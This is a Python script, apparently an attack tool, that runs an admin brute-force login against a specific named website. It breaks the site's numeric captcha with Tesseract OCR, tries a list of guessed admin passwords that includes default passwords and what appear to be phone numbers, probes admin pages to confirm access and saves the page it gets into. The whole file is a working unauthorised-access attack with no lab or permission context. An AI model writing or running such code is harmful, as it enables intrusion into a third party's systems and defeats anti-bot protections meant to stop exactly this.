import pytesseract
from PIL import Image
import requests
import io
import re

def get_clean_captcha(session, max_attempts=20):
    """Keep downloading captchas until we get exactly 4 digits."""
    for attempt in range(max_attempts):
        r = session.get("http://bjhzsv.com/main/inc/code.asp", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        if r.status_code != 200:
            continue
        
        img = Image.open(io.BytesIO(r.content))
        big = img.resize((400, 100), Image.NEAREST)
        
        # Try multiple OCR configs
        configs = [
            '--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789',
            '--psm 7 --oem 3 -c tessedit_char_whitelist=0123456789', 
            '--psm 13 --oem 3 -c tessedit_char_whitelist=0123456789',
            '--psm 6 --oem 3 -c tessedit_char_whitelist=0123456789',
        ]
        
        for cfg in configs:
            text = pytesseract.image_to_string(big, config=cfg).strip()
            clean = re.sub(r'[^0-9]', '', text)
            if len(clean) == 4:
                print(f"  Got 4-digit captcha: {clean} (config: {cfg})")
                return clean
        
        # Try binarized
        gray = big.convert('L')
        for thresh in [160, 180, 200, 220]:
            bw = gray.point(lambda x, t=thresh: 0 if x < t else 255)
            text = pytesseract.image_to_string(bw, config='--psm 8 --oem 3 -c tessedit_char_whitelist=0123456789').strip()
            clean = re.sub(r'[^0-9]', '', text)
            if len(clean) == 4:
                print(f"  Got 4-digit captcha: {clean} (binarized thresh={thresh})")
                return clean
        
        # If we got 3 digits, try padding
        for cfg in configs:
            text = pytesseract.image_to_string(big, config=cfg).strip()
            clean = re.sub(r'[^0-9]', '', text)
            if 3 <= len(clean) <= 5:
                # Take first 4
                captcha = clean[:4].ljust(4, '0')
                print(f"  Partial captcha: {text!r} -> clean={clean} -> using {captcha}")
                return captcha
    
    return None

def try_login(password):
    """Full login attempt with captcha retry."""
    session = requests.Session()
    
    # Get main page
    r = session.get("http://bjhzsv.com/main/", headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
    print(f"  Session established, cookie: {dict(session.cookies)}")
    
    # Get captcha
    captcha = get_clean_captcha(session, max_attempts=15)
    if not captcha:
        print(f"  [FAIL] Could not get valid captcha after multiple attempts")
        return False, None
    
    # POST login
    login_data = {"t1": "admin", "t2": password, "t3": captcha}
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Content-Type": "application/x-www-form-urlencoded",
        "Referer": "http://bjhzsv.com/main/"
    }
    
    r = session.post("http://bjhzsv.com/main/a7chkuser.asp", data=login_data, headers=headers, timeout=15)
    print(f"  Login response: HTTP {r.status_code}, {len(r.text)} bytes")
    
    # Follow JS redirect
    match = re.search(r"href='([^']+)'", r.text)
    if match:
        target = match.group(1)
        print(f"  JS redirect to: {target}")
        if not target.startswith("http"):
            target = "http://bjhzsv.com/main/" + target
        r2 = session.get(target, headers={"User-Agent": "Mozilla/5.0"}, timeout=15)
        print(f"  After redirect: {len(r2.text)} bytes")
        
        # Check if content changed significantly (means login worked)
        # Login page has 1888 bytes, if different size means we're in
        if len(r2.text) < 1800 or len(r2.text) > 2000:
            print(f"  *** DIFFERENT PAGE SIZE! Possible success! ***")
            print(f"  Content: {r2.text[:500]}")
            return True, r2.text
        
        # Check for admin content
        if 'admin' in r2.text.lower() or '管理' in r2.text or 'left.asp' in r2.text or 'top.asp' in r2.text:
            print(f"  Contains admin keywords")
        
        # Try accessing admin pages
        for page in ["admin_index.asp", "admin_main.asp", "left.asp", "top.asp", "right.asp", "manage.asp"]:
            r3 = session.get(f"http://bjhzsv.com/main/{page}", headers={"User-Agent": "Mozilla/5.0"}, timeout=10)
            if r3.status_code == 200 and len(r3.text) > 100 and 'login' not in r3.text.lower() and 'a7chkuser' not in r3.text:
                print(f"  Admin page found: {page} ({len(r3.text)} bytes)")
                print(f"  Content: {r3.text[:300]}")
                return True, r3.text
    
    return False, None

passwords = [
    "admin",
    "admin999",
    "admin888", 
    "123456",
    "bjhzsv",
    "bjhzsv.com",
    "13681449049",
    "01062489782"
]

print("=" * 60)
print("BJZHSV.COM BRUTE-FORCE LOGIN")
print("=" * 60)

for pwd in passwords:
    print(f"\n{'='*60}")
    print(f"TRYING: admin:{pwd}")
    print(f"{'='*60}")
    
    success, resp = try_login(pwd)
    
    if success:
        print(f"\n  *** SUCCESS! Password found: {pwd} ***")
        with open(f"/tmp/bjhzsv_success.html", "w") as f:
            f.write(resp)
        break
    else:
        print(f"  -> Failed for {pwd}")

print("\n" + "=" * 60)
print("DONE")
print("=" * 60)
